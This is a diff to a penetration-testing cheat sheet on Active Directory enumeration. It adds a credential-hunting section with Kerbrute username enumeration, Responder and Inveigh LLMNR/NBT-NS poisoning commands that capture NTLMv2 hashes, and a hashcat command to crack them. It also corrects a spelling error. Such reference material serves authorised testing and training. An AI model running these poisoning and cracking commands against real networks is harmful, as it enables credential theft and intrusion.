@@ -1,5 +1,37 @@
 # Active Directory - Enumeration
 
+## Credential Hunting
+
+Finding something from nothing
+
+* [Kerbrute](https://github.com/ropnop/kerbrute.git)
+  ```bash
+  kerbrute userenum -d 'domain' --dc 0.0.0.0 <wordlist> -o <outfile>
+  ```
+* Responder
+  ```bash
+  # Default Settings
+  sudo responder -I <iface>
+  
+  # Provides NTLMv2 Hashes. Cannot be used for PTH and must be cracked
+  hashcat -a 0 -m 5600 <hashfile> <wordlist>
+  ```
+* [Inveigh](https://github.com/Kevin-Robertson/Inveigh) - No longer Updated
+  ```ps1
+  Import-Module .\Inveigh.ps1
+  
+  #LLMNR/NBT-NS Poisoning
+  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+  ```
+* [InveighZero](https://github.com/Kevin-Robertson/Inveigh) - C# Version, Currently Updated
+  ```ps1
+  # Default Run
+  .\Inveigh.exe
+
+  # Press [esc] to enter the console
+  Get NTLMV@UNIQUE # View Hashes
+  Get NTLMV2USERNAMES # View Usernames
+  ```
 ## User Hunting
 
 Sometimes you need to find a machine where a specific user is logged in.
@@ -197,7 +229,7 @@ Replace the customqueries.json file located at `/home/username/.config/bloodhoun
   (Get-DomainPolicy)."kerberos policy"
   ```
 
-* **Get Domain Controlers:**
+* **Get Domain Controllers:**
 
   ```powershell
   Get-NetDomainController
